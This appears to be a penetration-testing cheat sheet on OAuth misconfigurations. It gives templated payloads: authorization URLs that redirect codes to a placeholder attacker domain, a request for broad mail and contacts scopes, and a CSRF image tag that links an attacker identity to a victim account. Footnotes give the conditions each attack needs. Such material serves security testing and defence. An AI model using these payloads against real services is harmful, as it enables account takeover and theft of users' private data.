# OAuth Misconfiguration

## Table of Contents
- [Account Takeover](#account-takeover)
- [Data Exfiltration](#data-exfiltration)

## Account Takeover

### The identity the service trusts can be redirected, forged, or attached to someone else's account, giving the attacker the victim's account rather than their own.

- Redirecting the authorization code to the attacker [^1]
    ```
    https://[IDENTITY-PROVIDER]/oauth/authorize?client_id=[VULNERABLE-SERVICE-CLIENT-ID]&redirect_uri=https://[ATTACKER-DOMAIN]/callback&response_type=code&scope=openid%20email
    ```
    A victim who is already signed in to the identity provider is redirected to the attacker with a code issued for the vulnerable service. The attacker exchanges it and holds the victim's session.

- Leaking the authorization code through the `Referer` header
    ```
    https://[VULNERABLE-SERVICE]/callback?code=[AUTHORIZATION-CODE]&state=[STATE]
    ```
    Any third-party resource loaded by the landing page receives this full URL, including the code, in its `Referer` header.

- Attaching the attacker's identity to the victim's account [^2]
    ```html
    <!-- Delivered to a victim who is signed in to the vulnerable service -->
    <img src="https://[VULNERABLE-SERVICE]/oauth/link?code=[ATTACKER-AUTHORIZATION-CODE]">
    ```
    The attacker begins the linking flow with their own identity-provider account and delivers the resulting code to the victim. Their identity is then attached to the victim's account, so "Sign in with ..." logs the attacker in as the victim — and continues to work after the victim changes their password.

- Matching accounts on an unverified email address
    - The attacker registers at an identity provider that never proves ownership of the address, using the victim's email. A service that links accounts by email alone then hands over the victim's account on first sign-in.

- Replaying a token issued for a different client
    - The victim signs in to an application the attacker controls using the same identity provider. The attacker submits the resulting token to the vulnerable service, which accepts it without checking which client it was issued to, and receives a session as the victim.

## Data Exfiltration

### A code stolen from the service's own client can be exchanged for a token carrying every scope that client holds, not only the ones the service actually uses.

- Exchanging a stolen code for a broadly scoped token
    ```
    https://[IDENTITY-PROVIDER]/oauth/authorize?client_id=[VULNERABLE-SERVICE-CLIENT-ID]&redirect_uri=https://[ATTACKER-DOMAIN]/callback&response_type=code&scope=openid%20email%20contacts.read%20mail.read
    ```
    The victim's data at the identity provider — contacts, mail, stored files — becomes reachable to the attacker, so the damage is not confined to the vulnerable service.

[^1]: Applies when `redirect_uri` is validated loosely, by prefix, by substring, or by accepting any subdomain, instead of being compared exactly against a registered value. An open redirect on an allowed domain has the same effect.
[^2]: Applies when the authorization response is not bound to the session that started the flow, that is, when `state` is absent or never verified.
